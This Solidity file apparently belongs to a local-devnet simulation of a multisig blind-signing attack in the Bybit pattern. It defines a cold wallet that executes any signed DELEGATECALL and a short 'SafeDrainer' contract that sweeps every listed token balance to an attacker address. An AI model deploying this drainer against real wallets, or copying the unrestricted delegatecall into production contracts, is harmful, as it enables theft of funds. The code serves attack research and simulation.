// SPDX-License-Identifier: MIT
// Attacker A5 (blind signing at a multisig cold wallet, the Bybit/WazirX/Radiant pattern).
// Local devnet only. Kept apart from contracts.sol so the bytecode of the other runs stays unchanged.
pragma solidity 0.8.28;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// Minimal M-of-N multisig with an optional co-signer that must also sign (the custodian's signer S).
/// Like Safe, it can CALL or DELEGATECALL; a DELEGATECALL runs foreign code with the wallet's storage
/// and balances, which is how the Bybit cold wallet was taken over.
contract ColdSafe {
    mapping(address => bool) public isOwner;
    uint256 public immutable threshold;
    address public immutable cosigner;
    uint256 public nonce;

    constructor(address[] memory owners, uint256 t, address c) {
        for (uint256 i = 0; i < owners.length; i++) isOwner[owners[i]] = true;
        threshold = t;
        cosigner = c;
    }

    function txHash(address to, uint256 value, bytes calldata data, uint8 operation, uint256 n) public view returns (bytes32) {
        return keccak256(abi.encode(block.chainid, address(this), to, value, keccak256(data), operation, n));
    }

    /// sigs: `threshold` owner signatures (65 bytes each, signers in increasing address order), then the co-signer's.
    function execTransaction(address to, uint256 value, bytes calldata data, uint8 operation, bytes calldata sigs) external returns (bool ok) {
        bytes32 h = txHash(to, value, data, operation, nonce);
        require(sigs.length == 65 * (threshold + (cosigner == address(0) ? 0 : 1)), "sig count");
        address last = address(0);
        for (uint256 i = 0; i < threshold; i++) {
            address s = recover(h, sigs[65 * i:65 * i + 65]);
            require(isOwner[s] && s > last, "owner sig");
            last = s;
        }
        if (cosigner != address(0)) require(recover(h, sigs[65 * threshold:65 * threshold + 65]) == cosigner, "cosigner sig");
        nonce++;
        if (operation == 1) (ok, ) = to.delegatecall(data);
        else (ok, ) = to.call{value: value}(data);
        require(ok, "exec failed");
    }

    function recover(bytes32 h, bytes calldata sig) internal pure returns (address) {
        bytes32 r = bytes32(sig[0:32]);
        bytes32 s = bytes32(sig[32:64]);
        uint8 v = uint8(sig[64]);
        return ecrecover(h, v, r, s);
    }

    receive() external payable {}
}

/// Attacker code reached through DELEGATECALL: runs as the wallet and sends everything to `to`.
contract SafeDrainer {
    function drain(address[] calldata tokens, address to) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 b = IERC20(tokens[i]).balanceOf(address(this));
            if (b > 0) IERC20(tokens[i]).transfer(to, b);
        }
    }
}
